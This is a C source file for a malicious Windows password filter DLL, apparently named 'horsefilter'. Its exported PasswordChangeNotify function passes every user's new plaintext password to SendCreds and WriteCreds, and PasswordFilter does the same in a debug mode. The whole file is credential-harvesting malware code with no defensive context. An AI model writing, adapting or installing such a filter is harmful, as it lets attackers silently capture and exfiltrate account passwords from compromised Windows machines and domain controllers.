#include "horsefilter.h"

__declspec(dllexport)
BOOLEAN WINAPI
InitializeChangeNotify(void)
{
	return TRUE;
}

__declspec(dllexport)
NTSTATUS WINAPI
PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	SendCreds(UserName, NewPassword, NULL, "PasswordChangeNotify");
	WriteCreds(UserName, NewPassword, NULL, "PasswordChangeNotify");
	return TRUE;
}

__declspec(dllexport)
BOOLEAN WINAPI
PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	if (DEBUG)
	{
		SendCreds(AccountName, Password, NULL, "PasswordFilter");
		WriteCreds(AccountName, Password, NULL, "PasswordFilter");
	}
	return TRUE;
}
